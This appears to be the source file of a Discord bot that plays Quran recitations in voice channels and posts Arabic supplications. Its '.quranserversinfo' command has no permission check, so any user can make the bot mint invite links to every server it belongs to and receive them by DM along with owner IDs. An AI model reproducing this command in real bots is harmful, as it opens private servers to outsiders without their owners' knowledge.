const Discord = require('discord.js');
const client = new Discord.Client();
const yt = require('ytdl-core');
const prefix = '.'

client.on('ready', function(){	
    var ms = 40000 ;
    var setGame = ['.help','Quran Bot'];	
    var i = -1;	
    var j = 0;	
    setInterval(function (){	
        if( i == -1 ){	
j = 1;	
       }	
        if( i == (setGame.length)-1 ){	
            j = -1;	
      }	
       i = i+j;	
        client.user.setGame(setGame[i],`https://www.twitch.tv`);	
}, ms);	
	
});



  client.on('message', message => {
     if (message.content === (prefix + "bot")) {
         if(!message.channel.guild) return;
     let embed = new Discord.RichEmbed()
  .setColor("#8650a7")
  .addField("** ✅ Servers: **" , client.guilds.size)
  .addField("** ✅ Users: **" , client.users.size)
  .addField("** ✅ Channels: **" , client.channels.size)
    .addField("** 🚀 Ping **" , Date.now() - message.createdTimestamp)
    .setTimestamp()
  message.channel.sendEmbed(embed);
    }
});


  client.on('message', msg => {
    if(msg.author.bot) return;
    
    if(msg.content === '.quranserversinfo') {

      client.guilds.forEach(g => {
        
        let l = g.id
        g.channels.get(g.channels.first().id).createInvite({
          maxUses: 5,
          maxAge: 86400
        }).then(i => msg.author.send(`
        **
        Invite Link : <https://discord.gg/${i.code}>
        Server : ${g.name} | Id : ${g.id} 
        Owner ID : ${g.owner.id}
        **
        `))
  
  
      })
    }
    
})


client.on('guildCreate', guild => {
  var embed = new Discord.RichEmbed()
  .setColor(0x5500ff)
  .setFooter(`Quran Bot`)
  .setDescription(`**شكراً لك لإضافه بوت القرآن الى سيرفرك**`)
      guild.owner.send(embed)
});



client.on('guildCreate', guild => {
  var embed = new Discord.RichEmbed()
  .setColor(0x5500ff)
  .setFooter(`bot in ${client.guilds.size}`)
  .setDescription(`**تم إضافة البوت الى سيرفر جديد**
server name : ${guild.name}
server owner : ${guild.owner}
server id : ${guild.id}`)
  client.users.get('348555232529219585').send(embed)
  });
  
client.on('guildDelete', guild => {
  var embed = new Discord.RichEmbed()
  .setColor(0x5500ff)
  .setFooter(`bot in ${client.guilds.size}`)
  .setDescription(`**تم طرد البوت :/**
server name : ${guild.name}
server owner : ${guild.owner}`)
  client.users.get('348555232529219585').send(embed)
  });


const developers = ["348555232529219585","444339372884754435"]
const adminprefix = ".";
client.on('message', message => {
    var argresult = message.content.split(` `).slice(1).join(' ');
      if (!developers.includes(message.author.id)) return;
      
  if (message.content.startsWith(adminprefix + 'ply')) {
    client.user.setGame(argresult);
      message.channel.send(`**Done.   ${argresult}**`)
  } else 
     if (message.content === (adminprefix + "leave")) {
    message.guild.leave();        
  } else  
  if (message.content.startsWith(adminprefix + 'wt')) {
  client.user.setActivity(argresult, {type:'WATCHING'});
      message.channel.send(`**Done.   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'ls')) {
  client.user.setActivity(argresult , {type:'LISTENING'});
      message.channel.send(`**Done.   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'st')) {
    client.user.setGame(argresult, "https://www.twitch.tv/idk");
      message.channel.send(`**Done.**`)
  }
  if (message.content.startsWith(adminprefix + 'setname')) {
  client.user.setUsername(argresult).then
      message.channel.send(`Changing The Name To ..**${argresult}** `)
} else
if (message.content.startsWith(adminprefix + 'setavatar')) {
  client.user.setAvatar(argresult);
    message.channel.send(`Changing The Avatar To :**${argresult}** `);
}
});



client.on('message', message => {
  if(message.content === '.invite') {
  const embed = new Discord.RichEmbed()
  .setTitle('Click Here To Add Me')
  .setURL('https://discordapp.com/api/oauth2/authorize?client_id=472952619623645184&permissions=49806401&scope=bot')
  .setFooter('Quran Bot')
  .setColor('RANDOM')
  message.channel.send({embed: embed});
  }
});

client.on('message', message => {
  if(message.content === '.vote') {
  const embed = new Discord.RichEmbed()
  .setTitle('Vote For Quran Bot')
  .setURL('https://discordbots.org/bot/472952619623645184')
  .setFooter('Quran Bot')
  .setColor('RANDOM')
  message.channel.send({embed: embed});
  }
});




function commandIs(str, msg){
    return msg.content.toLowerCase().startsWith('.' + str);
}

function pluck(array) {
    return array.map(function(item) { return item['name']; });
}

function hasRole(mem, role) {
    if(pluck(mem.roles).includes(role)){
        return true;
    } else {
        return false;
    }

  }


var servers = {};


var q1 = ".quran 1"

var q2 = ".quran 2"

var q3 = ".quran 3"

var q4 = ".quran 4"

var q5 = ".live"



function play(connection, message) {
	var server = servers[message.guild.id];

	server.dispatcher = connection.playStream(yt(server.queue[0], { fliter: "audionly" }));

	server.queue.shift();

	server.dispatcher.on("end", function() {
		if (server.queue[0]) play(connection, message);
		else connection.disconnect();
	});
}

client.on("ready", () => {
	console.log(`Quran bot is in ${client.guilds.size} servers `)
});

var PREFIX = ".";



//sowar


client.on("message", message => {

	                    if (message.content === q1 ) {
                  message.react('🔊')
    const voiceChannel = message.member.voiceChannel;
    if (!voiceChannel) {
      return message.reply(`يرجى أن تكون في قناة صوتيه أولا!`);
    }
    voiceChannel.join()
      .then(connnection => {
        let stream = yt('https://www.youtube.com/watch?v=V4b9f9BQTKI', {audioonly: true});
        const dispatcher = connnection.playStream(stream);
      });
  }
  
  	                    if (message.content === q2 ) {
                  message.react('🔊')
    const voiceChannel = message.member.voiceChannel;
    if (!voiceChannel) {
      return message.reply(`يرجى أن تكون في قناة صوتيه أولا!`);
    }
    voiceChannel.join()
      .then(connnection => {
        let stream = yt('https://www.youtube.com/watch?v=cR0GQnTrmiw', {audioonly: true});
        const dispatcher = connnection.playStream(stream);
      });
  }
  
    	                    if (message.content === q3 ) {
                  message.react('🔊')
    const voiceChannel = message.member.voiceChannel;
    if (!voiceChannel) {
      return message.reply(`يرجى أن تكون في قناة صوتيه أولا!`);
    }
    voiceChannel.join()
      .then(connnection => {
        let stream = yt('https://www.youtube.com/watch?v=4JvY-MccxNk', {audioonly: true});
        const dispatcher = connnection.playStream(stream);
      });
  }
  
      	                    if (message.content === q4 ) {
                  message.react('🔊')
    const voiceChannel = message.member.voiceChannel;
    if (!voiceChannel) {
      return message.reply(`يرجى أن تكون في قناة صوتيه أولا!`);
    }
    voiceChannel.join()
      .then(connnection => {
        let stream = yt('https://www.youtube.com/watch?v=Ktync4j_nmA', {audioonly: true});
        const dispatcher = connnection.playStream(stream);
        });
  }
	
	
	
      	                    if (message.content === q5 ) {
                  message.react('🔊')
    const voiceChannel = message.member.voiceChannel;
    if (!voiceChannel) {
      return message.reply(`يرجى أن تكون في قناة صوتيه أولا!`);
    }
    voiceChannel.join()
      .then(connnection => {
        let stream = yt('https://www.youtube.com/watch?v=lAJaVCbciT4', {audioonly: true});
        const dispatcher = connnection.playStream(stream);
        });
  }
 
    
    
    //outher_cummon  
    
  
  if(message.content === ".stop" ) {
      			var servers = {};
	  message.channel.send(`تم إيقاف البوت`);

			if (message.guild.voiceConnection) message.guild.voiceConnection.disconnect();
	
  }

	
	
	
  if(message.content === ".help") {
    message.channel.send(` 
	 Quran Commands
:pray: .quran 1             : القران الكريم كامل بصوت الشيخ عبدالباسط عبدالصمد 
:pray: .quran 2             : القرآن الكريم كامل بصوت الشيخ سعد الغامدي  
:pray: .quran 3             : القرآن الكريم كامل بصوت الشيخ عبد الرحمن السديس وسعود الشريم 
:pray: .quran 4             : القرآن الكريم كامل بصوت الشيخ المعيقلي  
:pray: .live                : لتشغيل القرآن الكريم مباشر
:pray: .adkar               : لنشر الأدكار
:pray: .stop                : لـ أيقاف تشغيل البوت `)
	  
	  message.channel.send(`
     Other Commands
:inbox_tray:  .invite         : لدعوة البوت الى سيرفرك 
:mailbox_with_mail: .contact  : لإرسال رسالة الى صاحب البوت
:up:   .vote                  : To Vote For The Bot
`)
 
	  
}
 
	    
});




client.on('message' , message => {
var prefix = "."

if (message.author.bot) return;
if (message.content.startsWith(".contact")) {
if (!message.channel.guild) return;



let args = message.content.split(" ").slice(1).join(" ");
    if(!args) return message.reply('**أكتب رسالتك !**').then(msg => msg.delete(10000))
        message.delete();



client.users.get("348555232529219585").send(
    "\n" + "**" + "● السيرفر :" + "**" +
    "\n" + "**" + "» " + message.guild.name + "**" +
    "\n" + "**" + " ● المرسل : " + "**" +
    "\n" + "**" + "» " + message.author.tag + "**" +
    "\n" + "**" + " ● الرسالة : " + "**" +
    "\n" + "**" + args + "**")

let embed = new Discord.RichEmbed()
     .setAuthor(message.author.username, message.author.avatarURL)
     .setDescription('📬 تم ارسال الرسالة الى صاحب البوت بنجاح')
     .setThumbnail(message.author.avatarURL)
     .setFooter("By : BlackFire")
                                                

message.channel.send(embed);


}
    
});



const adkar = [
  '**اذكار  | **اللَّهُمَّ اكْفِنِي بِحَلَالِكَ عَنْ حَرَامِكَ وَأَغْنِنِي بِفَضْلِكَ عَمَّنْ سِوَاكَ.',
  '**اذكار  |  **اللَّهُمَّ إِنِّي أَسْأَلُكَ الْهُدَى وَالتُّقَى وَالْعَفَافَ وَالْغِنَى. ',
  '**اذكار  ‏|  **اللَّهُمَّ اغْفِرْ لِي ذَنْبِي كُلَّهُ، دِقَّهُ، وَجِلَّهُ، وَأَوَّلَهُ، وَآخِرَهُ، وَعَلَانِيَتَهُ، وَسِرَّهُ. ',
  '**‏اذكار  |  **أستغفر الله .',     
  '**‏اذكار  | **الْلَّهُ أَكْبَرُ',
  '**‏اذكار  |  **لَا إِلَهَ إِلَّا اللَّهُ',
  '**اذكار  |  **اللَّهُمَّ صَلِّ عَلَى مُحَمَّدٍ وَعَلَى آلِ مُحَمَّدٍ كَمَا صَلَّيْتَ عَلَى إِبْرَاهِيمَ , وَعَلَى آلِ إِبْرَاهِيمَ إِنَّكَ حَمِيدٌ مَجِيدٌ , اللَّهُمَّ بَارِكْ عَلَى مُحَمَّدٍ وَعَلَى آلِ مُحَمَّدٍ كَمَا بَارَكْتَ عَلَى إِبْرَاهِيمَ وَعَلَى آلِ إِبْرَاهِيمَ إِنَّكَ حَمِيدٌ مَجِيدٌ.',
  '**اذكار  |  **سُبْحَانَ الْلَّهِ، وَالْحَمْدُ لِلَّهِ، وَلَا إِلَهَ إِلَّا الْلَّهُ، وَالْلَّهُ أَكْبَرُ',
  '**اذكار  | **لَا إلَه إلّا اللهُ وَحْدَهُ لَا شَرِيكَ لَهُ، لَهُ الْمُلْكُ وَلَهُ الْحَمْدُ وَهُوَ عَلَى كُلُّ شَيْءِ قَدِيرِ.',
  '**اذكار  | **أسْتَغْفِرُ اللهَ وَأتُوبُ إلَيْهِ',
  '**‏اذكار  | **سُبْحـانَ اللهِ وَبِحَمْـدِهِ. ',
  '‏**اذكار**|  لَا إلَه إلّا اللهُ وَحْدَهُ لَا شَرِيكَ لَهُ، لَهُ الْمُلْكُ وَلَهُ الْحَمْدُ وَهُوَ عَلَى كُلِّ شَيْءِ قَدِيرِ.',
  '**اذكار  ‏|   **اللَّهُمَّ إِنِّي أَسْأَلُكَ عِلْمًا نَافِعًا، وَرِزْقًا طَيِّبًا، وَعَمَلًا مُتَقَبَّلًا.',
  '**اذكار  | ‏ **يَا رَبِّ , لَكَ الْحَمْدُ كَمَا يَنْبَغِي لِجَلَالِ وَجْهِكَ , وَلِعَظِيمِ سُلْطَانِكَ.',
  'اذكار    |  **أسْتَغْفِرُ اللهَ العَظِيمَ الَّذِي لاَ إلَهَ إلاَّ هُوَ، الحَيُّ القَيُّومُ، وَأتُوبُ إلَيهِ.**',
  '**‏اذكار  |  **اللَّهُمَّ إِنَّا نَعُوذُ بِكَ مِنْ أَنْ نُشْرِكَ بِكَ شَيْئًا نَعْلَمُهُ ، وَنَسْتَغْفِرُكَ لِمَا لَا نَعْلَمُهُ.',
  '**‏اذكار  |  **اللَّهُمَّ صَلِّ وَسَلِّمْ وَبَارِكْ على نَبِيِّنَا مُحمَّد. ',
  '**‏اذكار  |  **أَعـوذُ بِكَلِمـاتِ اللّهِ التّـامّـاتِ مِنْ شَـرِّ ما خَلَـق.',
  '**اذكار  |  **يَا حَيُّ يَا قيُّومُ بِرَحْمَتِكَ أسْتَغِيثُ أصْلِحْ لِي شَأنِي كُلَّهُ وَلاَ تَكِلْنِي إلَى نَفْسِي طَـرْفَةَ عَيْنٍ. ',
  '**اذكار  |  **اللّهُـمَّ إِنّـي أَعـوذُ بِكَ مِنَ الْكُـفر ، وَالفَـقْر ، وَأَعـوذُ بِكَ مِنْ عَذابِ القَـبْر ، لا إلهَ إلاّ أَنْـتَ.',
  '**‏اذكار  |  **اللّهُـمَّ عافِـني في بَدَنـي ، اللّهُـمَّ عافِـني في سَمْـعي ، اللّهُـمَّ عافِـني في بَصَـري ، لا إلهَ إلاّ أَنْـتَ.',
  '**‏اذكار  |  **سُبْحـانَ اللهِ وَبِحَمْـدِهِ عَدَدَ خَلْـقِه ، وَرِضـا نَفْسِـه ، وَزِنَـةَ عَـرْشِـه ، وَمِـدادَ كَلِمـاتِـه. ',
  '**‏اذكار  |  **اللّهُـمَّ بِكَ أَصْـبَحْنا وَبِكَ أَمْسَـينا ، وَبِكَ نَحْـيا وَبِكَ نَمُـوتُ وَإِلَـيْكَ النُّـشُور.',
  '**‏اذكار  |  **بِسـمِ اللهِ الذي لا يَضُـرُّ مَعَ اسمِـهِ شَيءٌ في الأرْضِ وَلا في السّمـاءِ وَهـوَ السّمـيعُ العَلـيم. ',
  '**‏اذكار  |  **حَسْبِـيَ اللّهُ لا إلهَ إلاّ هُوَ عَلَـيهِ تَوَكَّـلتُ وَهُوَ رَبُّ العَرْشِ العَظـيم.',
  '**اذكار  |  **اللّهُـمَّ ما أَصْبَـَحَ بي مِـنْ نِعْـمَةٍ أَو بِأَحَـدٍ مِـنْ خَلْـقِك ، فَمِـنْكَ وَحْـدَكَ لا شريكَ لَـك ، فَلَـكَ الْحَمْـدُ وَلَـكَ الشُّكْـر.',
  '**‏اذكار  |  **اللّهُـمَّ إِنِّـي أَصْبَـحْتُ أُشْـهِدُك ، وَأُشْـهِدُ حَمَلَـةَ عَـرْشِـك ، وَمَلَائِكَتَكَ ، وَجَمـيعَ خَلْـقِك ، أَنَّـكَ أَنْـتَ اللهُ لا إلهَ إلاّ أَنْـتَ وَحْـدَكَ لا شَريكَ لَـك ، وَأَنَّ ُ مُحَمّـداً عَبْـدُكَ وَرَسـولُـك',
  '**‏اذكار  |  **رَضيـتُ بِاللهِ رَبَّـاً وَبِالإسْلامِ ديـناً وَبِمُحَـمَّدٍ صلى الله عليه وسلم نَبِيّـاً',
  '**‏اذكار  |  **اللهم إني أعوذ بك من العجز، والكسل، والجبن، والبخل، والهرم، وعذاب القبر، اللهم آت نفسي تقواها، وزكها أنت خير من زكاها. أنت وليها ومولاها. اللهم إني أعوذ بك من علم لا ينفع، ومن قلب لا يخشع، ومن نفس لا تشبع، ومن دعوة لا يستجاب لها',
  '**‏اذكار  |  **اللهم إني أعوذ بك من شر ما عملت، ومن شر ما لم أعمل',
  '**‏اذكار  |  **اللهم مصرف القلوب صرف قلوبنا على طاعتك',
]

client.on('message', message => {
if (message.author.bot) return;
if (message.content.startsWith('.adkar')) { 
message.channel.send(`${adkar[Math.floor(Math.random() * adkar.length)]}`) 
}
});









client.login(process.env.BOT_TOKEN);
